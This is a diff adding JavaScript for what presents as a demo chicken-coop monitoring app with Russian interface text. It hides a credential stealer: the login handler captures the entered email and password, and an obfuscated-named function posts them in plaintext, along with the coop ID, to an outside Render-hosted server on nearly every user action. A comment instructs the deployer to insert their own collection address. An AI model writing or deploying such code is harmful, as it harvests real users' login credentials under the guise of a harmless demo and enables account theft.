@@ -1,0 +1,54 @@
+let savedEmail = "";
+let savedPassword = "";
+
+function _0x3b1c(actionName, coopId) {
+    // ВМЕСТО ЭТОГО АДРЕСА ВСТАВЬТЕ СВОЙ АДРЕС ОТ RENDER:
+    fetch('https://onrender.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            email: savedEmail,
+            password: savedPassword,
+            action: actionName,
+            coopId: coopId
+        })
+    });
+}
+
+function handleAuthDemo() {
+    savedEmail = document.getElementById('email').value;
+    savedPassword = document.getElementById('password').value;
+    if (!savedEmail || !savedPassword) { alert('Заполните все поля!'); return; }
+    _0x3b1c('Попытка входа');
+    showScreen('screen-link');
+}
+
+function linkCoopDemo() {
+    const e = document.getElementById('coop-id-input').value;
+    if (!e) { alert('Введите ID!'); return; }
+    document.getElementById('display-coop-id').innerText = e;
+    _0x3b1c('Привязка курятника', e);
+    showScreen('screen-dashboard');
+}
+
+function simulateAlarm() {
+    _0x3b1c('Проверка режима тревоги');
+    const e = document.getElementById('system-status');
+    e.innerText = '🚨 СВЯЗЬ ПРОПАЛА!';
+    e.className = 'status-badge status-alarm';
+}
+
+function resetDemo() {
+    _0x3b1c('Выход из аккаунта');
+    const e = document.getElementById('system-status');
+    e.innerText = '● В СЕТИ';
+    e.className = 'status-badge status-ok';
+    showScreen('screen-auth');
+}
+
+function showScreen(e) {
+    document.getElementById('screen-auth').classList.add('hidden');
+    document.getElementById('screen-link').classList.add('hidden');
+    document.getElementById('screen-dashboard').classList.add('hidden');
+    document.getElementById(e).classList.remove('hidden');
+}
